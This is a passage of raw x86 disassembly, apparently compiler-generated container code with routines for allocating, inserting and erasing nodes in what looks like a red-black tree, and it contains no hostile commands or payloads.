   14019:	push   esi
   1401a:	push   edi
   1401b:	push   DWORD PTR [ebp+0xc]
   1401e:	mov    edi,ecx
   14020:	call   0x130aa
   14025:	push   DWORD PTR [ebp+0xc]
   14028:	mov    ecx,edi
   1402a:	mov    esi,eax
   1402c:	call   0x12d92
   14031:	mov    ecx,DWORD PTR [ebp+0x8]
   14034:	pop    edi
   14035:	mov    DWORD PTR [ecx],eax
   14037:	mov    DWORD PTR [ecx+0x4],esi
   1403a:	mov    eax,ecx
   1403c:	pop    esi
   1403d:	pop    ebp
   1403e:	ret    0x8
   14041:	int3   
   14042:	int3   
   14043:	int3   
   14044:	int3   
   14045:	int3   
   14046:	mov    edi,edi
   14048:	push   esi
   14049:	push   edi
   1404a:	push   0x1
   1404c:	xor    edi,edi
   1404e:	push   edi
   1404f:	mov    esi,ecx
   14051:	call   0x1395e
   14056:	cmp    DWORD PTR ds:0x7f8c4,edi
   1405c:	jne    0x14073
   1405e:	mov    ecx,eax
   14060:	mov    DWORD PTR ds:0x7f8c4,ecx
   14066:	mov    DWORD PTR [ecx],edi
   14068:	mov    ecx,DWORD PTR ds:0x7f8c4
   1406e:	xor    eax,eax
   14070:	mov    DWORD PTR [ecx+0x8],edi
   14073:	inc    DWORD PTR ds:0x7fa14
   14079:	cmp    eax,edi
   1407b:	je     0x14084
   1407d:	push   eax
   1407e:	call   0x1d9f8
   14083:	pop    ecx
   14084:	push   edi
   14085:	push   DWORD PTR ds:0x7f8c4
   1408b:	mov    ecx,esi
   1408d:	call   0x1395e
   14092:	mov    DWORD PTR [esi+0xc],edi
   14095:	mov    DWORD PTR [esi+0x4],eax
   14098:	mov    DWORD PTR [eax],eax
   1409a:	mov    esi,DWORD PTR [esi+0x4]
   1409d:	pop    edi
   1409e:	mov    DWORD PTR [esi+0x8],esi
   140a1:	pop    esi
   140a2:	ret    
   140a3:	int3   
   140a4:	int3   
   140a5:	int3   
   140a6:	int3   
   140a7:	int3   
   140a8:	mov    edi,edi
   140aa:	push   ebp
   140ab:	mov    ebp,esp
   140ad:	push   esi
   140ae:	push   edi
   140af:	push   DWORD PTR [ebp+0xc]
   140b2:	mov    edi,ecx
   140b4:	call   0x13188
   140b9:	push   DWORD PTR [ebp+0xc]
   140bc:	mov    ecx,edi
   140be:	mov    esi,eax
   140c0:	call   0x12dd2
   140c5:	mov    ecx,DWORD PTR [ebp+0x8]
   140c8:	pop    edi
   140c9:	mov    DWORD PTR [ecx],eax
   140cb:	mov    DWORD PTR [ecx+0x4],esi
   140ce:	mov    eax,ecx
   140d0:	pop    esi
   140d1:	pop    ebp
   140d2:	ret    0x8
   140d5:	int3   
   140d6:	int3   
   140d7:	int3   
   140d8:	int3   
   140d9:	int3   
   140da:	mov    edi,edi
   140dc:	push   esi
   140dd:	push   edi
   140de:	push   0x1
   140e0:	xor    edi,edi
   140e2:	push   edi
   140e3:	mov    esi,ecx
   140e5:	call   0x139ca
   140ea:	cmp    DWORD PTR ds:0x7f8c8,edi
   140f0:	jne    0x14107
   140f2:	mov    ecx,eax
   140f4:	mov    DWORD PTR ds:0x7f8c8,ecx
   140fa:	mov    DWORD PTR [ecx],edi
   140fc:	mov    ecx,DWORD PTR ds:0x7f8c8
   14102:	xor    eax,eax
   14104:	mov    DWORD PTR [ecx+0x8],edi
   14107:	inc    DWORD PTR ds:0x7fa18
   1410d:	cmp    eax,edi
   1410f:	je     0x14118
   14111:	push   eax
   14112:	call   0x1d9f8
   14117:	pop    ecx
   14118:	push   edi
   14119:	push   DWORD PTR ds:0x7f8c8
   1411f:	mov    ecx,esi
   14121:	call   0x139ca
   14126:	mov    DWORD PTR [esi+0xc],edi
   14129:	mov    DWORD PTR [esi+0x4],eax
   1412c:	mov    DWORD PTR [eax],eax
   1412e:	mov    esi,DWORD PTR [esi+0x4]
   14131:	pop    edi
   14132:	mov    DWORD PTR [esi+0x8],esi
   14135:	pop    esi
   14136:	ret    
   14137:	int3   
   14138:	int3   
   14139:	int3   
   1413a:	int3   
   1413b:	int3   
   1413c:	mov    edi,edi
   1413e:	push   ebp
   1413f:	mov    ebp,esp
   14141:	push   esi
   14142:	push   edi
   14143:	push   DWORD PTR [ebp+0xc]
   14146:	mov    edi,ecx
   14148:	call   0x13266
   1414d:	push   DWORD PTR [ebp+0xc]
   14150:	mov    ecx,edi
   14152:	mov    esi,eax
   14154:	call   0x12e12
   14159:	mov    ecx,DWORD PTR [ebp+0x8]
   1415c:	pop    edi
   1415d:	mov    DWORD PTR [ecx],eax
   1415f:	mov    DWORD PTR [ecx+0x4],esi
   14162:	mov    eax,ecx
   14164:	pop    esi
   14165:	pop    ebp
   14166:	ret    0x8
   14169:	int3   
   1416a:	int3   
   1416b:	int3   
   1416c:	int3   
   1416d:	int3   
   1416e:	mov    edi,edi
   14170:	push   esi
   14171:	push   edi
   14172:	push   0x1
   14174:	xor    edi,edi
   14176:	push   edi
   14177:	mov    esi,ecx
   14179:	call   0x1393a
   1417e:	cmp    DWORD PTR ds:0x7f8cc,edi
   14184:	jne    0x1419b
   14186:	mov    ecx,eax
   14188:	mov    DWORD PTR ds:0x7f8cc,ecx
   1418e:	mov    DWORD PTR [ecx],edi
   14190:	mov    ecx,DWORD PTR ds:0x7f8cc
   14196:	xor    eax,eax
   14198:	mov    DWORD PTR [ecx+0x8],edi
   1419b:	inc    DWORD PTR ds:0x7fa1c
   141a1:	cmp    eax,edi
   141a3:	je     0x141ac
   141a5:	push   eax
   141a6:	call   0x1d9f8
   141ab:	pop    ecx
   141ac:	push   edi
   141ad:	push   DWORD PTR ds:0x7f8cc
   141b3:	mov    ecx,esi
   141b5:	call   0x1393a
   141ba:	mov    DWORD PTR [esi+0xc],edi
   141bd:	mov    DWORD PTR [esi+0x4],eax
   141c0:	mov    DWORD PTR [eax],eax
   141c2:	mov    esi,DWORD PTR [esi+0x4]
   141c5:	pop    edi
   141c6:	mov    DWORD PTR [esi+0x8],esi
   141c9:	pop    esi
   141ca:	ret    
   141cb:	int3   
   141cc:	int3   
   141cd:	int3   
   141ce:	int3   
   141cf:	int3   
   141d0:	mov    edi,edi
   141d2:	push   ebp
   141d3:	mov    ebp,esp
   141d5:	push   ecx
   141d6:	push   esi
   141d7:	push   DWORD PTR [ebp+0xc]
   141da:	mov    esi,ecx
   141dc:	call   0x1329e
   141e1:	mov    DWORD PTR [ebp-0x4],eax
   141e4:	cmp    eax,DWORD PTR [esi+0x4]
   141e7:	je     0x141fe
   141e9:	add    eax,0xc
   141ec:	push   eax
   141ed:	push   DWORD PTR [ebp+0xc]
   141f0:	call   0x197c0
   141f5:	test   al,al
   141f7:	jne    0x141fe
   141f9:	lea    eax,[ebp-0x4]
   141fc:	jmp    0x14207
   141fe:	mov    eax,DWORD PTR [esi+0x4]
   14201:	mov    DWORD PTR [ebp+0xc],eax
   14204:	lea    eax,[ebp+0xc]
   14207:	mov    ecx,DWORD PTR [eax]
   14209:	mov    eax,DWORD PTR [ebp+0x8]
   1420c:	mov    DWORD PTR [eax],ecx
   1420e:	pop    esi
   1420f:	leave  
   14210:	ret    0x8
   14213:	int3   
   14214:	int3   
   14215:	int3   
   14216:	int3   
   14217:	int3   
   14218:	mov    edi,edi
   1421a:	push   ebp
   1421b:	mov    ebp,esp
   1421d:	push   ecx
   1421e:	push   ecx
   1421f:	push   ebx
   14220:	push   esi
   14221:	mov    DWORD PTR [ebp-0x4],ecx
   14224:	push   edi
   14225:	mov    edi,DWORD PTR [ebp+0xc]
   14228:	lea    ecx,[ebp+0xc]
   1422b:	call   0x12ec0
   14230:	mov    esi,DWORD PTR [edi]
   14232:	mov    eax,ds:0x7f8bc
   14237:	mov    ebx,edi
   14239:	mov    DWORD PTR [ebp-0x8],esi
   1423c:	cmp    esi,eax
   1423e:	jne    0x1425c
   14240:	mov    esi,DWORD PTR [edi+0x8]
   14243:	mov    eax,DWORD PTR [ebx+0x4]
   14246:	mov    ecx,DWORD PTR [ebp-0x4]
   14249:	mov    DWORD PTR [esi+0x4],eax
   1424c:	mov    eax,DWORD PTR [ecx+0x4]
   1424f:	cmp    DWORD PTR [eax+0x4],edi
   14252:	jne    0x142d1
   14254:	mov    DWORD PTR [eax+0x4],esi
   14257:	jmp    0x142df
   1425c:	mov    ecx,DWORD PTR [edi+0x8]
   1425f:	cmp    ecx,eax
   14261:	je     0x14243
   14263:	push   ecx
   14264:	call   0x11210
   14269:	mov    ebx,eax
   1426b:	mov    esi,DWORD PTR [ebx+0x8]
   1426e:	cmp    ebx,edi
   14270:	je     0x14243
   14272:	mov    eax,DWORD PTR [ebp-0x8]
   14275:	mov    DWORD PTR [eax+0x4],ebx
   14278:	mov    eax,DWORD PTR [edi]
   1427a:	mov    DWORD PTR [ebx],eax
   1427c:	cmp    ebx,DWORD PTR [edi+0x8]
   1427f:	jne    0x14286
   14281:	mov    DWORD PTR [esi+0x4],ebx
   14284:	jmp    0x1429d
   14286:	mov    eax,DWORD PTR [ebx+0x4]
   14289:	mov    DWORD PTR [esi+0x4],eax
   1428c:	mov    eax,DWORD PTR [ebx+0x4]
   1428f:	mov    DWORD PTR [eax],esi
   14291:	mov    eax,DWORD PTR [edi+0x8]
   14294:	mov    DWORD PTR [ebx+0x8],eax
   14297:	mov    eax,DWORD PTR [edi+0x8]
   1429a:	mov    DWORD PTR [eax+0x4],ebx
   1429d:	mov    eax,DWORD PTR [ebp-0x4]
   142a0:	mov    eax,DWORD PTR [eax+0x4]
   142a3:	cmp    DWORD PTR [eax+0x4],edi
   142a6:	jne    0x142ad
   142a8:	mov    DWORD PTR [eax+0x4],ebx
   142ab:	jmp    0x142bb
   142ad:	mov    eax,DWORD PTR [edi+0x4]
   142b0:	cmp    DWORD PTR [eax],edi
   142b2:	jne    0x142b8
   142b4:	mov    DWORD PTR [eax],ebx
   142b6:	jmp    0x142bb
   142b8:	mov    DWORD PTR [eax+0x8],ebx
   142bb:	mov    eax,DWORD PTR [edi+0x4]
   142be:	mov    DWORD PTR [ebx+0x4],eax
   142c1:	mov    eax,DWORD PTR [ebx+0x10]
   142c4:	mov    ecx,DWORD PTR [edi+0x10]
   142c7:	mov    DWORD PTR [ebx+0x10],ecx
   142ca:	mov    DWORD PTR [edi+0x10],eax
   142cd:	mov    ebx,edi
   142cf:	jmp    0x14332
   142d1:	mov    eax,DWORD PTR [edi+0x4]
   142d4:	cmp    DWORD PTR [eax],edi
   142d6:	jne    0x142dc
   142d8:	mov    DWORD PTR [eax],esi
   142da:	jmp    0x142df
   142dc:	mov    DWORD PTR [eax+0x8],esi
   142df:	mov    eax,DWORD PTR [ecx+0x4]
   142e2:	mov    DWORD PTR [ebp-0x8],eax
   142e5:	cmp    DWORD PTR [eax],edi
   142e7:	jne    0x14309
   142e9:	mov    edx,DWORD PTR [edi+0x8]
   142ec:	cmp    edx,DWORD PTR ds:0x7f8bc
   142f2:	jne    0x142fb
   142f4:	mov    edx,DWORD PTR [edi+0x4]
   142f7:	mov    DWORD PTR [eax],edx
   142f9:	jmp    0x14309
   142fb:	push   esi
   142fc:	call   0x11210
   14301:	mov    ecx,DWORD PTR [ebp-0x8]
   14304:	mov    DWORD PTR [ecx],eax
   14306:	mov    ecx,DWORD PTR [ebp-0x4]
   14309:	mov    eax,DWORD PTR [ecx+0x4]
   1430c:	mov    DWORD PTR [ebp-0x8],eax
   1430f:	cmp    DWORD PTR [eax+0x8],edi
   14312:	jne    0x14332
   14314:	mov    ecx,DWORD PTR [edi]
   14316:	cmp    ecx,DWORD PTR ds:0x7f8bc
   1431c:	jne    0x14326
   1431e:	mov    ecx,DWORD PTR [edi+0x4]
   14321:	mov    DWORD PTR [eax+0x8],ecx
   14324:	jmp    0x14332
   14326:	push   esi
   14327:	call   0x111ee
   1432c:	mov    ecx,DWORD PTR [ebp-0x8]
   1432f:	mov    DWORD PTR [ecx+0x8],eax
   14332:	xor    edi,edi
   14334:	inc    edi
   14335:	cmp    DWORD PTR [ebx+0x10],edi
   14338:	jne    0x1444f
   1433e:	jmp    0x143fd
   14343:	cmp    DWORD PTR [esi+0x10],edi
   14346:	jne    0x1444c
   1434c:	mov    eax,DWORD PTR [esi+0x4]
   1434f:	cmp    esi,DWORD PTR [eax]
   14351:	jne    0x143c8
   14353:	mov    eax,DWORD PTR [eax+0x8]
   14356:	cmp    DWORD PTR [eax+0x10],0x0
   1435a:	jne    0x14374
   1435c:	mov    DWORD PTR [eax+0x10],edi
   1435f:	mov    eax,DWORD PTR [esi+0x4]
   14362:	and    DWORD PTR [eax+0x10],0x0
   14366:	push   DWORD PTR [esi+0x4]
   14369:	call   0x12ef6
   1436e:	mov    eax,DWORD PTR [esi+0x4]
   14371:	mov    eax,DWORD PTR [eax+0x8]
   14374:	mov    ecx,DWORD PTR [eax]
   14376:	cmp    DWORD PTR [ecx+0x10],edi
   14379:	jne    0x14383
   1437b:	mov    ecx,DWORD PTR [eax+0x8]
   1437e:	cmp    DWORD PTR [ecx+0x10],edi
   14381:	je     0x143f6
   14383:	mov    ecx,DWORD PTR [eax+0x8]
   14386:	cmp    DWORD PTR [ecx+0x10],edi
   14389:	jne    0x143a3
   1438b:	mov    ecx,DWORD PTR [eax]
   1438d:	mov    DWORD PTR [ecx+0x10],edi
   14390:	mov    ecx,DWORD PTR [ebp-0x4]
   14393:	and    DWORD PTR [eax+0x10],0x0
   14397:	push   eax
   14398:	call   0x12f44
   1439d:	mov    eax,DWORD PTR [esi+0x4]
   143a0:	mov    eax,DWORD PTR [eax+0x8]
   143a3:	mov    ecx,DWORD PTR [esi+0x4]
   143a6:	mov    ecx,DWORD PTR [ecx+0x10]
   143a9:	mov    DWORD PTR [eax+0x10],ecx
   143ac:	mov    ecx,DWORD PTR [esi+0x4]
   143af:	mov    DWORD PTR [ecx+0x10],edi
   143b2:	mov    eax,DWORD PTR [eax+0x8]
   143b5:	mov    ecx,DWORD PTR [ebp-0x4]
   143b8:	mov    DWORD PTR [eax+0x10],edi
   143bb:	push   DWORD PTR [esi+0x4]
   143be:	call   0x12ef6
   143c3:	jmp    0x1444c
   143c8:	mov    eax,DWORD PTR [eax]
   143ca:	cmp    DWORD PTR [eax+0x10],0x0
   143ce:	jne    0x143e7
   143d0:	mov    DWORD PTR [eax+0x10],edi
   143d3:	mov    eax,DWORD PTR [esi+0x4]
   143d6:	and    DWORD PTR [eax+0x10],0x0
   143da:	push   DWORD PTR [esi+0x4]
   143dd:	call   0x12f44
   143e2:	mov    eax,DWORD PTR [esi+0x4]
   143e5:	mov    eax,DWORD PTR [eax]
   143e7:	mov    ecx,DWORD PTR [eax+0x8]
   143ea:	cmp    DWORD PTR [ecx+0x10],edi
   143ed:	jne    0x1440e
   143ef:	mov    ecx,DWORD PTR [eax]
   143f1:	cmp    DWORD PTR [ecx+0x10],edi
   143f4:	jne    0x1440e
   143f6:	and    DWORD PTR [eax+0x10],0x0
   143fa:	mov    esi,DWORD PTR [esi+0x4]
   143fd:	mov    ecx,DWORD PTR [ebp-0x4]
   14400:	mov    eax,DWORD PTR [ecx+0x4]
   14403:	cmp    esi,DWORD PTR [eax+0x4]
   14406:	jne    0x14343
   1440c:	jmp    0x1444c
   1440e:	mov    ecx,DWORD PTR [eax]
   14410:	cmp    DWORD PTR [ecx+0x10],edi
   14413:	jne    0x1442d
   14415:	mov    ecx,DWORD PTR [eax+0x8]
   14418:	mov    DWORD PTR [ecx+0x10],edi
   1441b:	mov    ecx,DWORD PTR [ebp-0x4]
   1441e:	and    DWORD PTR [eax+0x10],0x0
   14422:	push   eax
   14423:	call   0x12ef6
   14428:	mov    eax,DWORD PTR [esi+0x4]
   1442b:	mov    eax,DWORD PTR [eax]
   1442d:	mov    ecx,DWORD PTR [esi+0x4]
   14430:	mov    ecx,DWORD PTR [ecx+0x10]
   14433:	mov    DWORD PTR [eax+0x10],ecx
   14436:	mov    ecx,DWORD PTR [esi+0x4]
   14439:	mov    DWORD PTR [ecx+0x10],edi
   1443c:	mov    eax,DWORD PTR [eax]
   1443e:	mov    ecx,DWORD PTR [ebp-0x4]
   14441:	mov    DWORD PTR [eax+0x10],edi
   14444:	push   DWORD PTR [esi+0x4]
   14447:	call   0x12f44
   1444c:	mov    DWORD PTR [esi+0x10],edi
   1444f:	push   ebx
   14450:	call   0x1d9f8
   14455:	mov    eax,DWORD PTR [ebp-0x4]
   14458:	dec    DWORD PTR [eax+0xc]
   1445b:	mov    eax,DWORD PTR [ebp+0x8]
   1445e:	pop    ecx
   1445f:	mov    ecx,DWORD PTR [ebp+0xc]
   14462:	pop    edi
   14463:	pop    esi
   14464:	mov    DWORD PTR [eax],ecx
   14466:	pop    ebx
   14467:	leave  
   14468:	ret    0x8
   1446b:	int3   
   1446c:	int3   
   1446d:	int3   
   1446e:	int3   
   1446f:	int3   
   14470:	mov    edi,edi
   14472:	push   ebp
   14473:	mov    ebp,esp
   14475:	push   esi
   14476:	push   edi
   14477:	push   DWORD PTR [ebp+0xc]
   1447a:	mov    edi,ecx
   1447c:	call   0x133f4
   14481:	push   DWORD PTR [ebp+0xc]
   14484:	mov    ecx,edi
   14486:	mov    esi,eax
   14488:	call   0x133bc
   1448d:	mov    ecx,DWORD PTR [ebp+0x8]
   14490:	pop    edi
   14491:	mov    DWORD PTR [ecx],eax
   14493:	mov    DWORD PTR [ecx+0x4],esi
   14496:	mov    eax,ecx
   14498:	pop    esi
   14499:	pop    ebp
   1449a:	ret    0x8
   1449d:	int3   
   1449e:	int3   
   1449f:	int3   
   144a0:	int3   
   144a1:	int3   
   144a2:	mov    edi,edi
   144a4:	push   esi
   144a5:	push   edi
   144a6:	push   0x1
   144a8:	xor    edi,edi
   144aa:	push   edi
   144ab:	mov    esi,ecx
   144ad:	call   0x13982
   144b2:	cmp    DWORD PTR ds:0x7f8bc,edi
   144b8:	jne    0x144cf
   144ba:	mov    ecx,eax
   144bc:	mov    DWORD PTR ds:0x7f8bc,ecx
   144c2:	mov    DWORD PTR [ecx],edi
   144c4:	mov    ecx,DWORD PTR ds:0x7f8bc
   144ca:	xor    eax,eax
   144cc:	mov    DWORD PTR [ecx+0x8],edi
   144cf:	inc    DWORD PTR ds:0x7fa20
   144d5:	cmp    eax,edi
   144d7:	je     0x144e0
   144d9:	push   eax
   144da:	call   0x1d9f8
   144df:	pop    ecx
   144e0:	push   edi
   144e1:	push   DWORD PTR ds:0x7f8bc
   144e7:	mov    ecx,esi
   144e9:	call   0x13982
   144ee:	mov    DWORD PTR [esi+0xc],edi
   144f1:	mov    DWORD PTR [esi+0x4],eax
   144f4:	mov    DWORD PTR [eax],eax
   144f6:	mov    esi,DWORD PTR [esi+0x4]
   144f9:	pop    edi
   144fa:	mov    DWORD PTR [esi+0x8],esi
   144fd:	pop    esi
   144fe:	ret    
   144ff:	int3   
   14500:	int3   
   14501:	int3   
   14502:	int3   
   14503:	int3   
   14504:	mov    edi,edi
   14506:	push   ebp
   14507:	mov    ebp,esp
   14509:	push   ebx
   1450a:	push   esi
   1450b:	mov    esi,DWORD PTR [ebp+0x10]
   1450e:	push   edi
   1450f:	push   0x0
   14511:	push   esi
   14512:	mov    edi,ecx
   14514:	call   0x13982
   14519:	push   DWORD PTR [ebp+0x14]
   1451c:	mov    ebx,eax
   1451e:	mov    eax,ds:0x7f8bc
   14523:	mov    DWORD PTR [ebx],eax
   14525:	mov    eax,ds:0x7f8bc
   1452a:	mov    DWORD PTR [ebx+0x8],eax
   1452d:	lea    eax,[ebx+0xc]
   14530:	push   eax
   14531:	call   0x1a344
   14536:	inc    DWORD PTR [edi+0xc]
   14539:	cmp    esi,DWORD PTR [edi+0x4]
   1453c:	je     0x14560
   1453e:	mov    eax,DWORD PTR [ebp+0xc]
   14541:	cmp    eax,DWORD PTR ds:0x7f8bc
   14547:	jne    0x14560
   14549:	mov    eax,DWORD PTR [ebp+0x14]
   1454c:	mov    eax,DWORD PTR [eax]
   1454e:	cmp    eax,DWORD PTR [esi+0xc]
   14551:	jb     0x14560
   14553:	mov    DWORD PTR [esi+0x8],ebx
   14556:	mov    eax,DWORD PTR [edi+0x4]
   14559:	cmp    esi,DWORD PTR [eax+0x8]
   1455c:	jne    0x1457a
   1455e:	jmp    0x1456f
   14560:	mov    DWORD PTR [esi],ebx
   14562:	mov    eax,DWORD PTR [edi+0x4]
   14565:	cmp    esi,eax
   14567:	jne    0x14574
   14569:	mov    DWORD PTR [eax+0x4],ebx
   1456c:	mov    eax,DWORD PTR [edi+0x4]
   1456f:	mov    DWORD PTR [eax+0x8],ebx
   14572:	jmp    0x1457a
   14574:	cmp    esi,DWORD PTR [eax]
   14576:	jne    0x1457a
   14578:	mov    DWORD PTR [eax],ebx
   1457a:	mov    eax,DWORD PTR [edi+0x4]
   1457d:	mov    esi,ebx
   1457f:	cmp    ebx,DWORD PTR [eax+0x4]
   14582:	je     0x14636
   14588:	mov    eax,DWORD PTR [esi+0x4]
   1458b:	xor    edx,edx
   1458d:	cmp    DWORD PTR [eax+0x10],edx
   14590:	jne    0x14636
   14596:	mov    ecx,DWORD PTR [eax+0x4]
   14599:	cmp    eax,DWORD PTR [ecx]
   1459b:	jne    0x145d7
   1459d:	mov    ecx,DWORD PTR [ecx+0x8]
   145a0:	cmp    DWORD PTR [ecx+0x10],edx
   145a3:	je     0x145de
   145a5:	cmp    esi,DWORD PTR [eax+0x8]
   145a8:	jne    0x145b4
   145aa:	mov    esi,eax
   145ac:	push   esi
   145ad:	mov    ecx,edi
   145af:	call   0x12ef6
   145b4:	mov    eax,DWORD PTR [esi+0x4]
   145b7:	mov    DWORD PTR [eax+0x10],0x1
   145be:	mov    eax,DWORD PTR [esi+0x4]
   145c1:	mov    eax,DWORD PTR [eax+0x4]
   145c4:	and    DWORD PTR [eax+0x10],0x0
   145c8:	mov    eax,DWORD PTR [esi+0x4]
   145cb:	push   DWORD PTR [eax+0x4]
   145ce:	mov    ecx,edi
   145d0:	call   0x12f44
   145d5:	jmp    0x1462a
   145d7:	mov    ecx,DWORD PTR [ecx]
   145d9:	cmp    DWORD PTR [ecx+0x10],edx
   145dc:	jne    0x145fb
   145de:	mov    edx,eax
   145e0:	xor    eax,eax
   145e2:	inc    eax
   145e3:	mov    DWORD PTR [edx+0x10],eax
   145e6:	mov    DWORD PTR [ecx+0x10],eax
   145e9:	mov    eax,DWORD PTR [esi+0x4]
   145ec:	mov    eax,DWORD PTR [eax+0x4]
   145ef:	and    DWORD PTR [eax+0x10],0x0
   145f3:	mov    eax,DWORD PTR [esi+0x4]
   145f6:	mov    esi,DWORD PTR [eax+0x4]
   145f9:	jmp    0x1462a
   145fb:	cmp    esi,DWORD PTR [eax]
   145fd:	jne    0x14609
   145ff:	mov    esi,eax
   14601:	push   esi
   14602:	mov    ecx,edi
   14604:	call   0x12f44
   14609:	mov    eax,DWORD PTR [esi+0x4]
   1460c:	mov    DWORD PTR [eax+0x10],0x1
   14613:	mov    eax,DWORD PTR [esi+0x4]
   14616:	mov    eax,DWORD PTR [eax+0x4]
   14619:	and    DWORD PTR [eax+0x10],0x0
   1461d:	mov    eax,DWORD PTR [esi+0x4]
   14620:	push   DWORD PTR [eax+0x4]
   14623:	mov    ecx,edi
   14625:	call   0x12ef6
   1462a:	mov    eax,DWORD PTR [edi+0x4]
   1462d:	cmp    esi,DWORD PTR [eax+0x4]
   14630:	jne    0x14588
   14636:	mov    eax,DWORD PTR [edi+0x4]
   14639:	mov    eax,DWORD PTR [eax+0x4]
   1463c:	pop    edi
   1463d:	mov    DWORD PTR [eax+0x10],0x1
   14644:	mov    eax,DWORD PTR [ebp+0x8]
   14647:	pop    esi
   14648:	mov    DWORD PTR [eax],ebx
   1464a:	pop    ebx
   1464b:	pop    ebp
   1464c:	ret    0x10
   1464f:	int3   
   14650:	int3   
   14651:	int3   
   14652:	int3   
   14653:	int3   
   14654:	mov    edi,edi
   14656:	push   esi
   14657:	push   edi
   14658:	push   0x1
   1465a:	xor    edi,edi
   1465c:	push   edi
   1465d:	mov    esi,ecx
   1465f:	call   0x139a6
   14664:	cmp    DWORD PTR ds:0x7f8c0,edi
   1466a:	jne    0x14681
   1466c:	mov    ecx,eax
   1466e:	mov    DWORD PTR ds:0x7f8c0,ecx
   14674:	mov    DWORD PTR [ecx],edi
   14676:	mov    ecx,DWORD PTR ds:0x7f8c0
   1467c:	xor    eax,eax
   1467e:	mov    DWORD PTR [ecx+0x8],edi
   14681:	inc    DWORD PTR ds:0x7fa24
   14687:	cmp    eax,edi
   14689:	je     0x14692
   1468b:	push   eax
   1468c:	call   0x1d9f8
   14691:	pop    ecx
   14692:	push   edi
   14693:	push   DWORD PTR ds:0x7f8c0
   14699:	mov    ecx,esi
   1469b:	call   0x139a6
   146a0:	mov    DWORD PTR [esi+0xc],edi
   146a3:	mov    DWORD PTR [esi+0x4],eax
   146a6:	mov    DWORD PTR [eax],eax
   146a8:	mov    esi,DWORD PTR [esi+0x4]
   146ab:	pop    edi
   146ac:	mov    DWORD PTR [esi+0x8],esi
   146af:	pop    esi
   146b0:	ret    
   146b1:	int3   
   146b2:	int3   
   146b3:	int3   
   146b4:	int3   
   146b5:	int3   
   146b6:	mov    edi,edi
   146b8:	push   ebp
   146b9:	mov    ebp,esp
   146bb:	push   ebx
   146bc:	push   esi
   146bd:	mov    esi,DWORD PTR [ebp+0x10]
   146c0:	push   edi
   146c1:	push   0x0
   146c3:	push   esi
   146c4:	mov    edi,ecx
   146c6:	call   0x1393a
   146cb:	push   DWORD PTR [ebp+0x14]
   146ce:	mov    ebx,eax
   146d0:	mov    eax,ds:0x7f8b8
   146d5:	mov    DWORD PTR [ebx],eax
   146d7:	mov    eax,ds:0x7f8b8
   146dc:	mov    DWORD PTR [ebx+0x8],eax
   146df:	lea    eax,[ebx+0xc]
   146e2:	push   eax
   146e3:	call   0x11626
   146e8:	inc    DWORD PTR [edi+0xc]
   146eb:	cmp    esi,DWORD PTR [edi+0x4]
   146ee:	je     0x14712
   146f0:	mov    eax,DWORD PTR [ebp+0xc]
   146f3:	cmp    eax,DWORD PTR ds:0x7f8b8
   146f9:	jne    0x14712
   146fb:	mov    eax,DWORD PTR [ebp+0x14]
   146fe:	mov    eax,DWORD PTR [eax]
   14700:	cmp    eax,DWORD PTR [esi+0xc]
   14703:	jb     0x14712
   14705:	mov    DWORD PTR [esi+0x8],ebx
   14708:	mov    eax,DWORD PTR [edi+0x4]
   1470b:	cmp    esi,DWORD PTR [eax+0x8]
   1470e:	jne    0x1472c
   14710:	jmp    0x14721
   14712:	mov    DWORD PTR [esi],ebx
   14714:	mov    eax,DWORD PTR [edi+0x4]
   14717:	cmp    esi,eax
   14719:	jne    0x14726
   1471b:	mov    DWORD PTR [eax+0x4],ebx
   1471e:	mov    eax,DWORD PTR [edi+0x4]
   14721:	mov    DWORD PTR [eax+0x8],ebx
   14724:	jmp    0x1472c
   14726:	cmp    esi,DWORD PTR [eax]
   14728:	jne    0x1472c
   1472a:	mov    DWORD PTR [eax],ebx
   1472c:	mov    eax,DWORD PTR [edi+0x4]
   1472f:	mov    esi,ebx
   14731:	cmp    ebx,DWORD PTR [eax+0x4]
   14734:	je     0x147e8
   1473a:	mov    eax,DWORD PTR [esi+0x4]
   1473d:	xor    edx,edx
   1473f:	cmp    DWORD PTR [eax+0x14],edx
   14742:	jne    0x147e8
   14748:	mov    ecx,DWORD PTR [eax+0x4]
   1474b:	cmp    eax,DWORD PTR [ecx]
   1474d:	jne    0x14789
   1474f:	mov    ecx,DWORD PTR [ecx+0x8]
   14752:	cmp    DWORD PTR [ecx+0x14],edx
   14755:	je     0x14790
   14757:	cmp    esi,DWORD PTR [eax+0x8]
   1475a:	jne    0x14766
   1475c:	mov    esi,eax
   1475e:	push   esi
   1475f:	mov    ecx,edi
   14761:	call   0x12cf4
   14766:	mov    eax,DWORD PTR [esi+0x4]
   14769:	mov    DWORD PTR [eax+0x14],0x1
   14770:	mov    eax,DWORD PTR [esi+0x4]
   14773:	mov    eax,DWORD PTR [eax+0x4]
   14776:	and    DWORD PTR [eax+0x14],0x0
   1477a:	mov    eax,DWORD PTR [esi+0x4]
   1477d:	push   DWORD PTR [eax+0x4]
   14780:	mov    ecx,edi
   14782:	call   0x12d42
   14787:	jmp    0x147dc
   14789:	mov    ecx,DWORD PTR [ecx]
   1478b:	cmp    DWORD PTR [ecx+0x14],edx
   1478e:	jne    0x147ad
   14790:	mov    edx,eax
   14792:	xor    eax,eax
   14794:	inc    eax
   14795:	mov    DWORD PTR [edx+0x14],eax
   14798:	mov    DWORD PTR [ecx+0x14],eax
   1479b:	mov    eax,DWORD PTR [esi+0x4]
   1479e:	mov    eax,DWORD PTR [eax+0x4]
   147a1:	and    DWORD PTR [eax+0x14],0x0
   147a5:	mov    eax,DWORD PTR [esi+0x4]
   147a8:	mov    esi,DWORD PTR [eax+0x4]
   147ab:	jmp    0x147dc
   147ad:	cmp    esi,DWORD PTR [eax]
   147af:	jne    0x147bb
   147b1:	mov    esi,eax
   147b3:	push   esi
   147b4:	mov    ecx,edi
   147b6:	call   0x12d42
   147bb:	mov    eax,DWORD PTR [esi+0x4]
   147be:	mov    DWORD PTR [eax+0x14],0x1
   147c5:	mov    eax,DWORD PTR [esi+0x4]
   147c8:	mov    eax,DWORD PTR [eax+0x4]
   147cb:	and    DWORD PTR [eax+0x14],0x0
   147cf:	mov    eax,DWORD PTR [esi+0x4]
   147d2:	push   DWORD PTR [eax+0x4]
   147d5:	mov    ecx,edi
   147d7:	call   0x12cf4
   147dc:	mov    eax,DWORD PTR [edi+0x4]
   147df:	cmp    esi,DWORD PTR [eax+0x4]
   147e2:	jne    0x1473a
   147e8:	mov    eax,DWORD PTR [edi+0x4]
   147eb:	mov    eax,DWORD PTR [eax+0x4]
   147ee:	pop    edi
   147ef:	mov    DWORD PTR [eax+0x14],0x1
